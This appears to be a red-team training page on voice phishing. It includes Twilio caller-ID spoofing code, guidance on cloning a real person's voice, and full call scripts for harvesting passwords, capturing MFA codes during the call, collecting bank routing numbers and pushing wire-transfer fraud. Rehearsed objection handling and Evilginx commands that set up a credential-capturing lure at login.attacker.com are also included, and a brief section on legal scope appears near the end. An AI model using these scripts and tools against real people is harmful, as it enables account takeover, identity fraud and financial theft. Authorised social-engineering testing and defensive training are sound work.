---
layout: training-page
title: "Vishing — Red Team Academy"
module: "Social Engineering"
tags:
  - vishing
  - social-engineering
  - phone
  - pretexting
page_key: "se-vishing"
render_with_liquid: false
---

# Vishing

Vishing (voice phishing) uses phone calls to manipulate targets into revealing credentials, transferring funds, or taking actions that compromise security. It is often more effective than email phishing because people apply less scrutiny to phone calls and feel greater social pressure to comply in real time.

## Why Vishing Works

```
Real-time pressure    — target can't pause to think as easily as with email
Authority signals     — tone of voice conveys confidence and authority
Harder to verify      — fewer cues to check than a suspicious email link
Rapport building      — voice creates personal connection faster than text
Urgency is amplified  — spoken urgency is more compelling than written
```

## Infrastructure

### Caller ID Spoofing

```
# Services for spoofed outbound calls
SpoofCard          — consumer-grade, easy, limited
Twilio             — programmable voice, full control over caller ID
FreePBX / Asterisk — self-hosted PBX, route calls through SIP trunk
PhreakScript       — open source Asterisk-based telephony

# Set caller ID to:
# - Target company's main number
# - IT helpdesk DID
# - Known vendor number
# - Government / IRS / bank number (for external pretexts)

# Example: Twilio spoofed outbound call
from twilio.rest import Client
client = Client(account_sid, auth_token)
call = client.calls.create(
    to="+15551234567",
    from_="+15559876543",   # spoofed number
    url="http://yourserver/twiml/script.xml"
)
```

### Voice Changers / Modifiers

```
Clownfish Voice Changer   — real-time pitch/gender shift
MorphVOX Pro              — real-time voice transformation
AV Voice Changer          — multiple voice profiles
ElevenLabs                — AI voice cloning (ethical concerns — confirm scope)

# Use cases:
# - Male-presenting caller using female voice for IT persona
# - Pitch adjustment to sound older/more authoritative
# - Background noise injection (call center ambience)
```

## Call Scripts

### IT Helpdesk Password Reset

```
"Hi, this is [name] from the IT helpdesk — ticket number INC-48821.
We're migrating accounts to the new SSO portal this evening and I
need to confirm a few details before we can complete the transfer.

First, can you confirm your username? Great. And I just need you to
verify the current password so I can update the migration record —
this is just internal process, your password will be reset as part
of the migration anyway.

[If resistance]
I understand your hesitation — you're absolutely right to be careful.
This is coming from the helpdesk at extension 4-HELP — feel free to
call back and ask for ticket INC-48821 if you'd prefer. Just note
that the migration window closes at midnight tonight."
```

### Verification / Security Alert

```
"Hi [Name], this is [name] from the security operations team.
We've detected some unusual activity on your account — looks like
there was a login attempt from [foreign country] about 20 minutes ago.

I need to verify a few things to confirm it wasn't you.
Can you confirm the last four digits of your employee ID?

[After confirmation]
Thanks. Now I'm going to send a verification code to your mobile —
can you read that back to me when you get it?

[This captures the MFA/OTP code in real time]"
```

### Executive Impersonation (BEC)

```
"Hi [Name], this is [CEO name]'s assistant calling.
[CEO] is in a board meeting and asked me to reach out urgently —
there's a wire transfer that needs to be processed today to close
the [acquisition/deal]. I'm going to send you the details by email
in a few minutes. Can you confirm you're available to action this
this afternoon?

[After yes]
Perfect. He specifically asked this be kept confidential until the
announcement next week. I'll have the email to you within five minutes."
```

## Real-Time MFA Capture

```
# AiTM phishing (automated) is preferred, but manual vishing can capture OTPs:

# Scenario: Target believes they're verifying their account
# Attacker simultaneously:
# 1. Enters target's credentials into the real login page
# 2. Real site sends MFA code to target's phone
# 3. Attacker (on call) asks target to "read the verification code we just sent"
# 4. Target reads OTP — attacker enters it to complete authentication

# This works against TOTP, SMS OTP, and push-notification MFA
# Does NOT work against FIDO2/WebAuthn hardware keys (phishing-resistant)
```

## Handling Resistance

```
Target: "I'm not comfortable sharing that over the phone."
Response: "That's completely understandable — call me back at the main
           helpdesk number and ask for ticket INC-48821. I'll be here
           until 6pm. Just note the maintenance window closes at midnight."

Target: "Let me check with my manager first."
Response: "Of course. Just so you know, [manager name] is already aware —
           this is being rolled out across all teams today."

Target: "How did you get my direct number?"
Response: "It's in the company directory — we reach out by phone for
           security-sensitive account actions rather than email."

Target: "I'm going to report this call."
Response: [End call professionally]
           "That's the right thing to do — please do report it to your
           security team. Have a good day." [Terminate immediately]
```

## Operational Notes

```
# Best times to call
Tuesday-Thursday, 9am-11am and 2pm-4pm
Avoid Mondays (busy) and Fridays (people leaving early)

# Call from a quiet environment
Background noise destroys credibility
Consider using a call center ambience track for legitimacy

# Keep calls short
Long calls increase suspicion and give targets time to think
Aim for 2-3 minutes maximum for credential harvest calls

# Document everything
Record calls (where legally permitted and in-scope)
Log time, target name, result, script used
```

---

## Full Call Script Library

### Script 1: IT Helpdesk — MFA Enrolment

```
OPENER:
"Hi, can I speak with [First Name]? ... Hi [Name], this is [Operator Name]
calling from the IT support desk — I'm working on ticket INC-[5-digit number].
Is now a good time for a quick two-minute call?"

CONTEXT BUILD:
"We're rolling out the new Microsoft Authenticator policy for your department
this week. I see your account is showing as pending enrolment, which means
your access will be suspended automatically tomorrow at 8am if we don't
complete this today."

ASK:
"What I need to do is verify your account before I can push the enrolment.
Can you confirm your username and your current password so I can mark the
migration as complete? It'll be immediately reset as part of the process —
this is just a verification step."

[If OTP requested:]
"Perfect — the system is sending a six-digit code to your mobile right now.
Can you read that back to me when it arrives? ... Great, that confirms
everything. Your Authenticator app should prompt you to set up within the
next 30 minutes. Any questions?"

CLOSE:
"Brilliant — you're all set. If you have any issues, just call the helpdesk
at [number] and reference ticket INC-[number]. Have a great day."
```

### Script 2: HR / Payroll Update

```
OPENER:
"Hi [Name], this is [Name] calling from HR — specifically from the payroll
operations team. Do you have a moment?"

CONTEXT BUILD:
"I'm reaching out because we've had a flag on your direct deposit record.
It looks like your bank routing information may not have transferred
correctly during our Workday system upgrade last month. Payroll runs
tomorrow and if we don't resolve this today, your payment will be held."

ASK:
"I just need to confirm your bank name and routing number to verify
against what we have on file. Can you confirm those for me?"

[If target offers to log into Workday directly:]
"The issue is actually that the Workday portal is temporarily down for
the upgrade — that's why we're calling directly. We'll have a fix ticket
open through Monday. If you can just confirm verbally, I'll update the
record manually and flag it for review when the portal's back up."

OBJECTION:
"Completely understood if you'd rather wait — just to let you know,
payments that aren't verified by 3pm today will be held until the
following pay cycle. That's 14 working days. But entirely your call."

CLOSE:
"Thanks [Name] — I've updated the record. You'll receive an email
confirmation from HR-noreply@[company] within the hour. Have a good day."
```

### Script 3: Vendor / Invoice Follow-Up

```
OPENER:
"Hi, can I speak with someone in accounts payable? ... Hi [Name],
I'm [Name] from [Vendor Name] — we're a software vendor to [Company],
I believe we work with your IT procurement team."

CONTEXT BUILD:
"I'm calling about invoice [INV-2026-0491] — it's about 45 days overdue
and I need to check whether there's been a processing issue on your end
or whether we need to re-submit. Our finance director has flagged this
for escalation."

ASK (Information gathering):
"Could you check your system for that invoice number and confirm the
status? Also, can you confirm the best email to send the re-submission to?
I want to make sure it goes to the right queue this time."

[After information extraction — pivot to credential ask:]
"Actually, one more thing — we have a vendor portal for tracking invoices
and I need to verify your contact details in our system. Could you confirm
your email and the last four digits of your vendor ID?

[Alternative payload delivery:]
"I'll send the invoice copy directly — our system will generate a link
to download it. Keep an eye out for an email from billing@[vendor-domain]
in the next 10 minutes."
```

### Script 4: Internal Security Team — Suspicious Activity

```
OPENER:
"Hi [Name], this is [Name] from the Information Security team.
I'm calling about some activity we've flagged on your account —
do you have a few minutes?"

CONTEXT BUILD:
"Our SIEM system flagged a login attempt on your account from an IP
address in [Eastern Europe/Asia] about 40 minutes ago. The attempt
failed, but our policy requires us to verify the account holder directly
whenever we see anomalous login activity from outside the country."

ASK:
"I need to run through a quick verification with you. First, can you
confirm you're currently logged into any corporate systems? ... And you
haven't shared your password with anyone or clicked any links recently?

[Build up to MFA capture:]
I'm going to push a security verification to your Authenticator app right
now — this just re-confirms your device binding. When the notification
comes through, please approve it and read me the six-digit code that
appears on screen."

[The approval/code is the real MFA push the attacker has triggered
by entering the target's credentials on the real login page]

CLOSE:
"Perfect — that confirms the account is secure. I've locked out the
anomalous session and added a security note to your account. You may
want to change your password as a precaution — our self-service portal
is at [real password reset URL]. Have a good afternoon."
```

---

## Live Call Tactics

### Handling Objections in Real Time

```
Objection: "Can I get your employee ID?"
  Response: "Sure — [made-up ID number]. You can also verify by calling
             the main helpdesk line and referencing ticket INC-[number]."

Objection: "Why do you need my password?"
  Response: "I understand the concern — I'm not storing it anywhere.
             It's just a one-time verification step that the migration
             script requires before it can reset your credentials
             automatically. After this call your password will be reset
             anyway."

Objection: "I'll just log in myself and change it."
  Response: "That's exactly what we want you to do — but the migration
             portal won't let you update until we run the backend
             verification first. This call is that verification step."

Objection: "I need to check with IT before doing this."
  Response: "Absolutely — feel free to call the helpdesk. Just reference
             ticket INC-[number] and they'll confirm the migration is
             running today. I'll be on this number for another hour if
             you want to call back."

Objection: "I don't believe this is a real call."
  Response: "That's a completely reasonable position — and honestly it's
             great that you're being cautious. Please do call back through
             the official helpdesk number. Your account will be flagged
             as pending until you confirm. Take care." [End call]
```

### Building Urgency Without Alarm

```
Effective urgency phrases:
  "The maintenance window closes at midnight tonight"
  "Payroll runs in 3 hours — I need this resolved before then"
  "Your access will be suspended automatically at 8am tomorrow"
  "This needs to be done before the compliance audit team reviews it"
  "I have 6 more calls to make this afternoon — I want to get yours
   done now so it doesn't slip"

Avoid:
  "This is EXTREMELY URGENT" — sounds like a scam
  "You will be FIRED if you don't" — too aggressive, triggers suspicion
  "I need this RIGHT NOW" — creates panic, triggers resistance
```

### Graceful Exits

```
When the call is going badly:
  "No problem at all — I'll follow up by email with the instructions
   so you have everything in writing. Look out for it from [persona email].
   Thanks for your time."

When the target is about to escalate:
  "That sounds great — please do loop in [manager name]. I'll call back
   in an hour once you've had a chance to confirm with them. Bye."

When clearly burned:
  "I completely understand — security first, always. Have a great day."
  [End the call professionally and do not attempt again from same persona]
```

---

## Voice Cloning for Targeted Attacks

Voice cloning allows impersonating a specific known individual — e.g., a CEO calling their CFO. This significantly elevates the believability of BEC-style vishing attacks.

### Tools and Setup

```
ElevenLabs (elevenlabs.io):
  - Upload 1–3 minutes of clean audio of the target voice
  - Train a voice model (called a "Voice" in ElevenLabs)
  - Generate audio from text input — near-real-time synthesis
  - Quality: very high; often indistinguishable to untrained listeners
  - Requires: audio source (conference call recording, YouTube interview,
              earnings call audio, podcast appearance)

PlayHT (play.ht):
  - Similar capability to ElevenLabs
  - API available for integration with calling infrastructure

RVC (Retrieval-based Voice Conversion) — open source:
  - Local, no API required — runs on GPU
  - Requires more audio samples than commercial alternatives
  - github.com/RVC-Project/Retrieval-based-Voice-Conversion-WebUI

Collecting audio samples:
  - LinkedIn audio introductions (some profiles have voice clips)
  - Earnings call recordings (public companies — investor relations page)
  - YouTube/podcast appearances
  - Conference talk recordings
  - Teams/Zoom recordings (if already gained partial access)
```

### Risks and Ethical Considerations

```
CRITICAL SCOPE REQUIREMENT:
  Voice cloning of real individuals MUST be explicitly in-scope.
  Get it in writing before this technique is used.
  Many jurisdictions have specific laws around voice deepfakes.

Detection:
  - AI voice detection tools exist (Resemble AI, AI or Not)
  - Real-time voice clone quality degrades on poor audio connections
  - Background artifacts may be present in synthesised audio
  - Unusual speech patterns (incorrect pauses, pronunciation quirks missing)

Mitigation by defenders:
  - Safe word / code word protocols for high-value authorisation requests
  - "Call me back on a known number" policy for wire transfers
  - Out-of-band confirmation (SMS from known number) for large requests
```

---

## Vishing with Evilginx Integration

Combining a vishing call with an Evilginx AiTM session captures credentials AND session cookies in real time.

### Workflow

```
Step 1: Set up Evilginx phishlet for the target service (O365, Okta, etc.)
        evilginx2
        : phishlets hostname o365 login.attacker.com
        : phishlets enable o365
        : lures create o365
        : lures get-url 0
        # Produces: https://login.attacker.com/aBcD3F

Step 2: Call the target using IT helpdesk pretext
        "I need you to re-verify your login — I'll send you a verification link."

Step 3: Send the Evilginx lure URL via SMS or email during the call
        "Check your phone — I've just sent a verification link."

Step 4: Target clicks the link and enters credentials on the cloned page
        Evilginx proxies authentication to the real server in real time
        Captures: username, password, AND the post-auth session cookie

Step 5: Attacker uses captured session cookie to access the account
        No further MFA challenge needed — session is already authenticated

# View captured sessions in Evilginx:
: sessions
: sessions 1
# Shows: username, password, tokens, cookies
```

---

## Legal Considerations and Scope Documentation

```
Before any vishing engagement:

1. Written authorisation:
   - Signed Statement of Work or Rules of Engagement document
   - Must explicitly permit vishing calls
   - Must list permitted impersonation scenarios
   - Must define target scope (all employees / named individuals / departments)

2. Emergency deconflict number:
   - Provide a contact number that the client can call to confirm
     the engagement is authorised (in case a target reports the call
     and triggers an incident response)
   - Carry the authorisation letter digitally during the engagement

3. Recording considerations:
   - Recording laws vary: single-party consent (US federal, many US states)
     vs two-party/all-party consent (California, Illinois, others)
   - UK: lawful basis for recording required under UK GDPR
   - Always check jurisdiction — err on the side of not recording if unclear
   - If recording is in scope, note it in the RoE document

4. Data handling:
   - Any credentials or PII captured via vishing must be stored securely
   - Agree on retention period and destruction timeline with the client
   - Do not store credentials in plaintext notes or unencrypted documents

5. Out of scope interactions:
   - If a non-scope employee answers, terminate professionally
   - Do not attempt to continue if you suspect the target is a minor
   - Avoid calling personal phones unless explicitly in scope
```

---

## Resources

- MITRE T1598 — Phishing for Information — `attack.mitre.org/techniques/T1598/`
- Twilio — programmable voice API — `twilio.com`
- FreePBX — open source PBX — `freepbx.org`
- ElevenLabs — AI voice synthesis — `elevenlabs.io`
- Evilginx — AiTM framework — `github.com/kgretzky/evilginx2`
- Social Engineering: The Science of Human Hacking — Christopher Hadnagy
- SEORG Podcast — Social-Engineer.org
- RVC Voice Conversion — `github.com/RVC-Project/Retrieval-based-Voice-Conversion-WebUI`
